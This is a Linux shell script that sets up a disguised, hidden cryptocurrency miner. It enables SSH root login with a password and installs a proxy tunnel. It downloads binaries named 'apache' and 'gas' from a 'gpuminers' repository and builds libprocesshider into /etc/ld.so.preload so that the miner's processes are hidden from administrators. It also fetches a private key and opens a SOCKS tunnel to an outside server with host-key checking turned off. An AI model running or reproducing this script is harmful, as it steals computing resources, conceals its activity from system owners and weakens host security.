#!/bin/sh
apt update;apt -y install unzip iftop cmake binutils build-essential screen net-tools curl nano cpuid neofetch automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev libnuma-dev

git clone https://github.com/bryanpkc/corkscrew.git
cd corkscrew
autoreconf --install
./configure
make && make install
cd

sed -i "s/#PermitRootLogin prohibit-password/PermitRootLogin yes/" /etc/ssh/sshd_config
cat >> /etc/ssh/ssh_config <<END
    ProxyCommand /usr/local/bin/corkscrew 10.140.0.96 3128 %h %p
END


service ssh restart


service sshd restart


ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://gitlab.com/chadpetersen1337/apache270/-/raw/main/apache
chmod +x apache

wget https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/magicApache.zip
unzip magicApache.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload


wget https://golang.org/dl/go1.16.6.linux-amd64.tar.gz
rm -rf /usr/local/go && tar -C /usr/local -xzf go1.16.6.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
source $HOME/.profile

wget https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

wget https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/graf.tar.gz
tar -xvzf graf.tar.gz

wget https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/local.tar.gz
tar -xvzf local.tar.gz

mv usr/local/bin/graftcp /usr/local/bin/

mv usr/local/bin/graftcp-local /usr/local/bin/


wget https://gitlab.com/chadpetersen1337/sshtunnel/-/raw/main/garethfairmountaio.pem
chmod 600 garethfairmountaio.pem
ssh ubuntu@34.227.206.125 -o StrictHostKeyChecking=no -D 1337 -f -C -q -N -i garethfairmountaio.pem -p 443


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:1338
END


./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

netstat -ntlp

./graftcp/graftcp ./gas

